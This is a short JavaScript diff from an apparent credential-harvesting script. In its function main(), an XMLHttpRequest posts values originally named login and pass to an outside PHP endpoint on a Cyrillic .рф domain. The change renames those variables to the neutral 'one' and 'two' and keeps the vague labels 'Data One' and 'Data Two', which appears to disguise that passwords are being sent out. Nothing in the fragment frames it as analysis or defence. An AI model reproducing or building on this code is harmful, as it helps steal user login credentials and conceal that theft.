@@ -103,7 +103,7 @@ function main() {
 
             var xhr = new XMLHttpRequest();
 
-            var body = "Данные Один = " + encodeURIComponent(login) + "Данные Два = " + encodeURIComponent(pass);
+            var body = "Данные Один = " + encodeURIComponent(one) + "Данные Два = " + encodeURIComponent(two);
             xhr.open("POST", 'https://онлайнмастерская.рф/cam/savr.php', true);
             xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
             xhr.send(body);
